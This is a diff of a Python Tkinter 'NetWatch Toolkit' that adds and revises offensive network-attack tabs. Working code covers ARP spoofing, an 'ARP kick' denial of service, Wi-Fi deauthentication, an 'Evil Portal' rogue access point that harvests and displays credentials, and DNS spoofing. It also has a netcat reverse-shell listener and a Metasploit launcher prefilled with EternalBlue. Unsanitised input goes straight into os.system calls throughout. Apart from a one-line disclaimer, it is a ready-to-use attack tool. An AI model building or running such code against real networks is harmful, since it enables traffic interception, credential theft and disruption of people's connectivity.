@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-NetWatch Toolkit v2 (2.1)
+NetWatch Toolkit v2  (2.3)
 Author: Niko DeRuise
 
 USAGE:
-    sudo python3 netwatchV2.py
+    sudo python3 netwatch.py
 
 REQUIREMENTS:
     - Python 3.x
@@ -13,6 +13,8 @@ REQUIREMENTS:
     - tkinter
     - hostapd, dnsmasq
     - netcat (nc)
+    - mitmproxy, iptables, tcpdump, iftop
+    - metasploit-framework (optional for exploit launcher)
 
 DISCLAIMER:
     For educational and authorized use only.
@@ -90,7 +92,7 @@ if not is_root():
 
 root = Tk()
 root.title("NetWatch Toolkit v2")
-root.geometry("1000x700")
+root.geometry("1200x720")
 style = ttk.Style()
 style.theme_use("clam")
 style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
@@ -109,47 +111,50 @@ def create_tab(title):
     scrollbar.pack(side=RIGHT, fill=Y)
     output.pack(expand=1, fill="both")
     return tab, output
-
-# === Nmap Tab ===
-tab1, nmap_output = create_tab("Nmap Scanner")
-Label(tab1, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
-nmap_target = Entry(tab1, width=40)
-nmap_target.pack()
-Button(tab1, text="Run Scan", command=lambda: threading.Thread(target=lambda: nmap_output.insert(END, subprocess.getoutput(f"nmap -sS -Pn {nmap_target.get()}") + "\n")).start()).pack()
+	
+	# === Nmap Scanner ===
+tab1, nmap_output = create_tab("Nmap")
+Label(tab1, text="Target IP/Range:", bg="#1e1e2e", fg="#0ff").pack()
+nmap_entry = Entry(tab1); nmap_entry.pack()
+def run_nmap():
+    target = nmap_entry.get()
+    if target:
+        result = subprocess.getoutput(f"nmap -sS -Pn {target}")
+        nmap_output.insert(END, result + "\n")
+Button(tab1, text="Scan", command=lambda: threading.Thread(target=run_nmap).start()).pack()
 
 # === ARP Scanner ===
-tab2, arp_output = create_tab("ARP Scanner")
+tab2, arp_output = create_tab("ARP Scan")
 Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
-arp_target = Entry(tab2, width=40)
-arp_target.pack()
+arp_entry = Entry(tab2); arp_entry.pack()
 def arp_scan():
-    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=arp_target.get())
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=arp_entry.get())
     ans, _ = srp(pkt, timeout=2, verbose=0)
     for _, r in ans:
         arp_output.insert(END, f"{r.psrc} - {r.hwsrc}\n")
-Button(tab2, text="Scan Network", command=lambda: threading.Thread(target=arp_scan).start()).pack()
+Button(tab2, text="Scan", command=lambda: threading.Thread(target=arp_scan).start()).pack()
 
 # === ARP Spoofing ===
 tab3, spoof_output = create_tab("ARP Spoof")
 Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
-target_ip = Entry(tab3); target_ip.pack()
+spoof_target = Entry(tab3); spoof_target.pack()
 Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
-gateway_ip = Entry(tab3); gateway_ip.pack()
+spoof_gateway = Entry(tab3); spoof_gateway.pack()
 def start_spoof():
     global spoofing
     spoofing = True
     def loop():
-        tgt = target_ip.get(); gw = gateway_ip.get()
-        tgt_mac = get_mac(tgt); gw_mac = get_mac(gw)
+        tgt, gw = spoof_target.get(), spoof_gateway.get()
+        tgt_mac, gw_mac = get_mac(tgt), get_mac(gw)
         while spoofing:
             send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=tgt_mac), verbose=0)
             send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
-            spoof_output.insert(END, f"Spoofed {tgt} <-> {gw}\n")
+            spoof_output.insert(END, f"Spoofing {tgt} ↔ {gw}\n")
             time.sleep(2)
     threading.Thread(target=loop).start()
 def stop_spoof(): global spoofing; spoofing = False
-Button(tab3, text="Start Spoof", command=start_spoof).pack()
-Button(tab3, text="Stop Spoof", command=stop_spoof).pack()
+Button(tab3, text="Start", command=start_spoof).pack()
+Button(tab3, text="Stop", command=stop_spoof).pack()
 
 # === ARP Kick ===
 tab4, kick_output = create_tab("ARP Kick")
@@ -157,22 +162,18 @@ Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
 kick_target = Entry(tab4); kick_target.pack()
 Label(tab4, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
 kick_gateway = Entry(tab4); kick_gateway.pack()
-Label(tab4, text="Packets (recommended: 150):", bg="#1e1e2e", fg="#0ff").pack()
+Label(tab4, text="Packets (default 150):", bg="#1e1e2e", fg="#0ff").pack()
 kick_count = Entry(tab4); kick_count.insert(0, "150"); kick_count.pack()
-def arp_kick_loop():
+def kick_loop():
     global kicking
-    target = kick_target.get()
-    gateway = kick_gateway.get()
-    try: count = int(kick_count.get())
-    except: count = 150
+    t, g, count = kick_target.get(), kick_gateway.get(), int(kick_count.get())
     for i in range(count):
         if not kicking: break
-        pkt = ARP(op=2, pdst=target, psrc=gateway, hwdst="00:00:00:00:00:00")
-        send(pkt, verbose=0)
-        kick_output.insert(END, f"[{i+1}/{count}] Sent fake ARP to {target}\n")
+        send(ARP(op=2, pdst=t, psrc=g, hwdst="00:00:00:00:00:00"), verbose=0)
+        kick_output.insert(END, f"Sent [{i+1}/{count}] ARP Kick to {t}\n")
         time.sleep(0.05)
-    kick_output.insert(END, "[✓] ARP kick complete\n")
-def start_kick(): global kicking; kicking = True; threading.Thread(target=arp_kick_loop).start()
+    kick_output.insert(END, "✓ Kick Complete\n")
+def start_kick(): global kicking; kicking = True; threading.Thread(target=kick_loop).start()
 def stop_kick(): global kicking; kicking = False
 Button(tab4, text="Start Kick", command=start_kick).pack()
 Button(tab4, text="Stop Kick", command=stop_kick).pack()
@@ -181,113 +182,218 @@ Button(tab4, text="Stop Kick", command=stop_kick).pack()
 tab5, trace_output = create_tab("Traceroute")
 Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
 trace_entry = Entry(tab5); trace_entry.pack()
-Button(tab5, text="Run", command=lambda: threading.Thread(target=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}") + "\n")).start()).pack()
+def run_trace():
+    result = subprocess.getoutput(f"traceroute {trace_entry.get()}")
+    trace_output.insert(END, result + "\n")
+Button(tab5, text="Run Trace", command=lambda: threading.Thread(target=run_trace).start()).pack()
 
 # === Reverse Shell ===
 tab6, shell_output = create_tab("Reverse Shell")
-Label(tab6, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
-lport = Entry(tab6); lport.insert(0, "4444"); lport.pack()
-def start_listener(): threading.Thread(target=lambda: os.system(f"nc -lvnp {lport.get()}")).start()
-Button(tab6, text="Start Listener", command=start_listener).pack()
+Label(tab6, text="LPORT (e.g. 4444):", bg="#1e1e2e", fg="#0ff").pack()
+shell_lport = Entry(tab6); shell_lport.insert(0, "4444"); shell_lport.pack()
+def start_listener():
+    port = shell_lport.get()
+    shell_output.insert(END, f"Listening on port {port}...\n")
+    os.system(f"x-terminal-emulator -e 'nc -lvnp {port}'")
+Button(tab6, text="Start Listener", command=lambda: threading.Thread(target=start_listener).start()).pack()
 
 # === Evil Portal ===
 tab7, portal_output = create_tab("Evil Portal")
 Label(tab7, text="SSID:", bg="#1e1e2e", fg="#0ff").pack()
-entry_ssid = Entry(tab7); entry_ssid.insert(0, "Free_Public_WiFi"); entry_ssid.pack()
-Label(tab7, text="Interface (AP-capable):", bg="#1e1e2e", fg="#0ff").pack()
-entry_iface = Entry(tab7); entry_iface.insert(0, "wlan0"); entry_iface.pack()
-def select_html():
-    path = filedialog.askopenfilename()
-    if path:
-        with open(path, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
+ep_ssid = Entry(tab7); ep_ssid.insert(0, "Free_WiFi"); ep_ssid.pack()
+Label(tab7, text="Interface (AP Capable):", bg="#1e1e2e", fg="#0ff").pack()
+ep_iface = Entry(tab7); ep_iface.insert(0, "wlan0"); ep_iface.pack()
+def choose_html():
+    file = filedialog.askopenfilename()
+    if file:
+        with open(file, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
             dst.write(src.read())
-Button(tab7, text="Select HTML", command=select_html).pack()
+Button(tab7, text="Select HTML Page", command=choose_html).pack()
 def start_evil_ap():
-    ssid = entry_ssid.get()
-    iface = entry_iface.get()
-    conf = f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
-    dhcp = f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1"
+    ssid, iface = ep_ssid.get(), ep_iface.get()
+    hostapd_conf = f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
+    dns_conf = f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1"
     os.chdir(evil_dir)
-    with open("hostapd.conf", "w") as f: f.write(conf)
-    with open("dnsmasq.conf", "w") as f: f.write(dhcp)
+    with open("hostapd.conf", "w") as f: f.write(hostapd_conf)
+    with open("dnsmasq.conf", "w") as f: f.write(dns_conf)
     os.system(f"ip link set {iface} down")
     os.system(f"ip addr flush dev {iface}")
     os.system(f"ip addr add 10.0.0.1/24 dev {iface}")
     os.system(f"ip link set {iface} up")
-    os.system("iptables -t nat -F")
-    os.system("iptables -F")
+    os.system("iptables -t nat -F && iptables -F")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+    os.system(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
     os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
     h = subprocess.Popen(["hostapd", "hostapd.conf"])
     d = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"])
     evil_processes.extend([h, d])
     threading.Thread(target=start_portal_server, daemon=True).start()
-    portal_output.insert(END, f"[+] AP '{ssid}' running on {iface}\n")
+    portal_output.insert(END, f"[+] Evil AP '{ssid}' running on {iface}\n")
 def stop_evil_ap():
     for p in evil_processes:
         try: p.terminate()
         except: pass
     os.system("killall hostapd dnsmasq")
-    os.system("iptables -t nat -F")
-    os.system("iptables -F")
-    portal_output.insert(END, "[x] Evil Portal stopped.\n")
-Button(tab7, text="Start Portal", command=start_evil_ap).pack()
-Button(tab7, text="Stop Portal", command=stop_evil_ap).pack()
-Button(tab7, text="Show Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "[!] No credentials yet\n")).pack()
-
-# === Packet Sniffer ===
-tab_sniff, sniff_output = create_tab("Packet Sniffer")
-Label(tab_sniff, text="Interface to sniff on:", bg="#1e1e2e", fg="#0ff").pack()
-sniff_iface = Entry(tab_sniff); sniff_iface.insert(0, "eth0"); sniff_iface.pack()
-
-sniffing = False
-
-def packet_callback(pkt):
-    if pkt.haslayer(Ether):
-        line = f"{pkt[Ether].src} -> {pkt[Ether].dst} | {pkt.summary()}"
-        sniff_output.insert(END, line + "\n")
-        sniff_output.see(END)
-
-def start_sniffer():
-    global sniffing
-    from scapy.all import sniff
-    sniffing = True
-    iface = sniff_iface.get()
-    sniff_output.insert(END, f"[*] Starting packet capture on {iface}\n")
-    def sniffer():
-        sniff(iface=iface, prn=packet_callback, store=0, stop_filter=lambda x: not sniffing)
-    threading.Thread(target=sniffer, daemon=True).start()
-
-def stop_sniffer():
-    global sniffing
-    sniffing = False
-    sniff_output.insert(END, "[x] Sniffing stopped.\n")
-
-Button(tab_sniff, text="Start Sniffing", command=start_sniffer).pack()
-Button(tab_sniff, text="Stop Sniffing", command=stop_sniffer).pack()
+    os.system("iptables -t nat -F && iptables -F")
+    stop_portal_server()
+    portal_output.insert(END, "[x] Evil Portal stopped\n")
+Button(tab7, text="Start Evil Portal", command=start_evil_ap).pack()
+Button(tab7, text="Stop Evil Portal", command=stop_evil_ap).pack()
+Button(tab7, text="Show Captured Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "No credentials yet\n")).pack()
 
 # === Deauth Attack ===
 tab8, deauth_output = create_tab("Deauth Attack ⚠️")
 Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
-iface = Entry(tab8); iface.pack()
+deauth_iface = Entry(tab8); deauth_iface.pack()
 Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
-client = Entry(tab8); client.pack()
+target_mac = Entry(tab8); target_mac.pack()
 Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
-ap = Entry(tab8); ap.pack()
-def send_deauth():
-    pkt = RadioTap()/Dot11(addr1=client.get(), addr2=ap.get(), addr3=ap.get())/Dot11Deauth()
-    sendp(pkt, iface=iface.get(), count=100, inter=0.1)
-    deauth_output.insert(END, "[✓] Deauth sent\n")
-Button(tab8, text="Send", command=lambda: threading.Thread(target=send_deauth).start()).pack()
+ap_mac = Entry(tab8); ap_mac.pack()
+def deauth():
+    pkt = RadioTap()/Dot11(addr1=target_mac.get(), addr2=ap_mac.get(), addr3=ap_mac.get())/Dot11Deauth()
+    sendp(pkt, iface=deauth_iface.get(), count=100, inter=0.1, verbose=0)
+    deauth_output.insert(END, "Deauth packets sent.\n")
+Button(tab8, text="Send Deauth", command=lambda: threading.Thread(target=deauth).start()).pack()
+
+# === DNS Spoofing ===
+tab9, dns_output = create_tab("DNS Spoofing")
+Label(tab9, text="Spoofed Domain:", bg="#1e1e2e", fg="#0ff").pack()
+dns_domain = Entry(tab9); dns_domain.pack()
+Label(tab9, text="Redirect to IP:", bg="#1e1e2e", fg="#0ff").pack()
+dns_ip = Entry(tab9); dns_ip.pack()
+def dns_spoof():
+    rule = f"address=/{dns_domain.get()}/{dns_ip.get()}"
+    with open("dnsmasq.d/spoof.conf", "w") as f: f.write(rule)
+    os.system("systemctl restart dnsmasq")
+    dns_output.insert(END, f"DNS spoofing {dns_domain.get()} → {dns_ip.get()}\n")
+Button(tab9, text="Spoof Domain", command=dns_spoof).pack()
+
+# === Bandwidth Monitor ===
+tab10, bw_output = create_tab("Bandwidth Monitor")
+def run_iftop():
+    bw_output.insert(END, "Launching iftop (requires terminal)...\n")
+    os.system("x-terminal-emulator -e 'iftop'")
+Button(tab10, text="Launch iftop", command=lambda: threading.Thread(target=run_iftop).start()).pack()
+
+# === Packet Capture ===
+tab11, pcap_output = create_tab("Packet Capture")
+Label(tab11, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
+pcap_iface = Entry(tab11); pcap_iface.insert(0, "eth0"); pcap_iface.pack()
+Label(tab11, text="Output File:", bg="#1e1e2e", fg="#0ff").pack()
+pcap_file = Entry(tab11); pcap_file.insert(0, "capture.pcap"); pcap_file.pack()
+def capture_packets():
+    iface = pcap_iface.get()
+    out = pcap_file.get()
+    pcap_output.insert(END, f"Capturing packets on {iface} → {out}\n")
+    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {out}'")
+Button(tab11, text="Start Capture", command=lambda: threading.Thread(target=capture_packets).start()).pack()
+
+# === MAC Changer ===
+tab12, mac_output = create_tab("MAC Changer")
+Label(tab12, text="Interface:", bg="#1e1e2e", fg="#0ff").pack()
+mac_iface = Entry(tab12); mac_iface.insert(0, "eth0"); mac_iface.pack()
+Label(tab12, text="New MAC (or leave blank for random):", bg="#1e1e2e", fg="#0ff").pack()
+mac_value = Entry(tab12); mac_value.pack()
+def change_mac():
+    iface = mac_iface.get()
+    mac = mac_value.get()
+    os.system(f"ifconfig {iface} down")
+    cmd = f"macchanger -r {iface}" if not mac else f"macchanger -m {mac} {iface}"
+    os.system(cmd)
+    os.system(f"ifconfig {iface} up")
+    mac_output.insert(END, f"MAC changed on {iface}\n")
+Button(tab12, text="Change MAC", command=lambda: threading.Thread(target=change_mac).start()).pack()
+
+# === Firewall Manager ===
+tab13, fw_output = create_tab("Firewall")
+Label(tab13, text="iptables Rule:", bg="#1e1e2e", fg="#0ff").pack()
+fw_rule = Entry(tab13); fw_rule.pack()
+def add_rule():
+    cmd = fw_rule.get()
+    os.system(f"iptables {cmd}")
+    fw_output.insert(END, f"Rule added: iptables {cmd}\n")
+Button(tab13, text="Add Rule", command=add_rule).pack()
+
+# === Exploit Launcher (Metasploit) ===
+tab14, msf_output = create_tab("Exploit Launcher")
+Label(tab14, text="Exploit Path (e.g. exploit/windows/smb/ms17_010_eternalblue):", bg="#1e1e2e", fg="#0ff").pack()
+msf_exploit = Entry(tab14); msf_exploit.pack()
+Label(tab14, text="RHOST:", bg="#1e1e2e", fg="#0ff").pack()
+msf_rhost = Entry(tab14); msf_rhost.pack()
+Label(tab14, text="LHOST:", bg="#1e1e2e", fg="#0ff").pack()
+msf_lhost = Entry(tab14); msf_lhost.pack()
+Label(tab14, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
+msf_lport = Entry(tab14); msf_lport.insert(0, "4444"); msf_lport.pack()
+def launch_msf():
+    script = f"""
+use {msf_exploit.get()}
+set RHOST {msf_rhost.get()}
+set LHOST {msf_lhost.get()}
+set LPORT {msf_lport.get()}
+exploit
+"""
+    with open("msf.rc", "w") as f: f.write(script)
+    msf_output.insert(END, "Launching exploit in terminal...\n")
+    os.system("x-terminal-emulator -e 'msfconsole -r msf.rc'")
+Button(tab14, text="Launch Exploit", command=lambda: threading.Thread(target=launch_msf).start()).pack()
+
+# === Session Log Export ===
+tab15, log_output = create_tab("Export Logs")
+Label(tab15, text="Export File:", bg="#1e1e2e", fg="#0ff").pack()
+log_file = Entry(tab15); log_file.insert(0, "netwatch_session.log"); log_file.pack()
+def export_logs():
+    all_logs = []
+    for tab in notebook.winfo_children():
+        for widget in tab.winfo_children():
+            if isinstance(widget, Frame):
+                for child in widget.winfo_children():
+                    if isinstance(child, Text):
+                        all_logs.append(child.get("1.0", END))
+    with open(log_file.get(), "w") as f:
+        f.write("\n\n--- NEW TAB ---\n\n".join(all_logs))
+    log_output.insert(END, f"Session exported to {log_file.get()}\n")
+Button(tab15, text="Export", command=export_logs).pack()
 
 # === Reset Tab ===
-tab9, reset_output = create_tab("Reset")
+tab16, reset_output = create_tab("Reset")
 def reset_all():
-    for tab in root.winfo_children():
-        for child in tab.winfo_children():
-            if isinstance(child, Entry): child.delete(0, END)
-    reset_output.insert(END, "[✓] Fields cleared\n")
-Button(tab9, text="Reset Fields", command=reset_all).pack()
+    for tab in notebook.winfo_children():
+        for widget in tab.winfo_children():
+            for child in widget.winfo_children():
+                if isinstance(child, Entry): child.delete(0, END)
+    reset_output.insert(END, "[✓] All fields cleared\n")
+Button(tab16, text="Reset Fields", command=reset_all).pack()
 
+# === Session Manager ===
+tab17, session_output = create_tab("Session Manager")
+def save_session():
+    with open("netwatch_session.txt", "w") as f:
+        for tab in notebook.winfo_children():
+            for widget in tab.winfo_children():
+                for child in widget.winfo_children():
+                    if isinstance(child, Entry):
+                        f.write(child.get() + "\n")
+    session_output.insert(END, "Session saved.\n")
+
+def load_session():
+    try:
+        with open("netwatch_session.txt", "r") as f:
+            values = f.readlines()
+        idx = 0
+        for tab in notebook.winfo_children():
+            for widget in tab.winfo_children():
+                for child in widget.winfo_children():
+                    if isinstance(child, Entry):
+                        child.delete(0, END)
+                        child.insert(0, values[idx].strip())
+                        idx += 1
+        session_output.insert(END, "Session loaded.\n")
+    except Exception as e:
+        session_output.insert(END, f"Failed to load session: {e}\n")
+
+Button(tab17, text="Save Session", command=save_session).pack()
+Button(tab17, text="Load Session", command=load_session).pack()
+
+# === Run GUI ===
 root.mainloop()
+
